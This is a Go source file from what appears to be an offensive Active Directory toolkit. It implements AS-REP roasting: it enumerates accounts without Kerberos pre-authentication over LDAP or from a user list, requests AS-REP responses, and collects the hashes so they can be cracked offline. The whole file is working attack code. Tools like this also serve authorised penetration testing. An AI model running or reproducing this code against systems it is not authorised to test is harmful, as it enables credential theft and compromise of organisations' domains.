package attacks

import (
	"context"
	"fmt"
	"strings"

	"adreaper/internal/config"
	"adreaper/internal/output"
	"adreaper/internal/recon"
)

// ASREPRoast identifies accounts with no Kerberos pre-auth and captures their AS-REP hashes.
// Supports discovery via LDAP or a provided users list.
func ASREPRoast(ctx context.Context, opts *config.Options, usersFile string) ([]string, error) {
	var targets []recon.User

	// Step 1: Discover targets
	if usersFile != "" {
		output.Info("Loading usernames from file: %s", usersFile)
		names, err := LoadUsersFile(usersFile)
		if err != nil {
			return nil, fmt.Errorf("load users: %w", err)
		}
		for _, name := range names {
			targets = append(targets, recon.User{SAMAccountName: name})
		}
	} else {
		ldapCl, err := recon.NewLDAPClient(opts)
		if err != nil {
			if !opts.IsAuthenticated() {
				return nil, fmt.Errorf("LDAP Null Bind failed. Discovery requires credentials or --users-file. Error: %w", err)
			}
			return nil, fmt.Errorf("LDAP connect: %w", err)
		}
		defer ldapCl.Close()

		targets, err = ldapCl.QueryASREPUsers(ctx)
		if err != nil {
			if !opts.IsAuthenticated() {
				return nil, fmt.Errorf("LDAP search failed (Null Bind likely disabled). Use credentials or --users-file. Error: %w", err)
			}
			return nil, fmt.Errorf("AS-REP user query: %w", err)
		}
	}

	if len(targets) == 0 {
		output.Info("No AS-REP roastable accounts found (no users with DONT_REQ_PREAUTH)")
		return nil, nil
	}

	if usersFile != "" {
		output.Info("Attempting AS-REP roast for %d accounts from file...", len(targets))
	} else {
		output.Info("Found %d AS-REP roastable account(s) via LDAP:", len(targets))
		for _, u := range targets {
			output.Warn("  → %s (%s) — Kerberos pre-auth disabled!", u.SAMAccountName, u.UPN)
		}
	}

	// Step 2: Send AS-REQ without pre-auth and extract hash
	var hashes []string
	for _, user := range targets {
		if opts.Verbose {
			output.Info("  Checking: %s", user.SAMAccountName)
		}
		res, err := recon.ASREPHash(opts, user.SAMAccountName)
		if err != nil {
			errStr := err.Error()
			if strings.Contains(errStr, "KDC Error: 25") || strings.Contains(errStr, "KDC_ERR_PREAUTH_REQUIRED") {
				if usersFile != "" || opts.Verbose {
					output.Warn("  [-] %s: Not vulnerable (Kerberos Pre-auth required)", user.SAMAccountName)
				}
			} else if strings.Contains(errStr, "KDC Error: 6") || strings.Contains(errStr, "KDC_ERR_C_PRINCIPAL_UNKNOWN") {
				if usersFile != "" || opts.Verbose {
					output.Error("  [x] %s: Account not found in active directory", user.SAMAccountName)
				}
			} else {
				if usersFile != "" || opts.Verbose {
					output.Warn("  [!] %s: %v", user.SAMAccountName, err)
				}
			}
			continue
		}
		hashes = append(hashes, res)
		output.Success("  [+] VULNERABLE: Account '%s' found with pre-auth disabled.", user.SAMAccountName)
		output.Info("      Hash capture successful! Saved for offline cracking.")
	}

	output.Info("")
	if len(hashes) == 0 {
		output.Warn("No AS-REP hashes were captured.")
	} else {
		output.Success("Successfully captured %d AS-REP hashes.", len(hashes))
	}
	return hashes, nil
}

// IdentifyASREPTargets returns the list of AS-REP roastable usernames (no creds needed).
func IdentifyASREPTargets(opts *config.Options) ([]string, error) {
	ctx := context.Background()

	// Try unauthenticated LDAP first
	ldapCl, err := recon.NewLDAPClient(opts)
	if err != nil {
		// Fall back to Kerberos user enumeration if LDAP fails
		return nil, fmt.Errorf("LDAP not available for unauthenticated query: %w", err)
	}
	defer ldapCl.Close()

	users, err := ldapCl.QueryASREPUsers(ctx)
	if err != nil {
		return nil, err
	}
	names := make([]string, 0, len(users))
	for _, u := range users {
		names = append(names, fmt.Sprintf("%s@%s", u.SAMAccountName, opts.Domain))
	}
	return names, nil
}
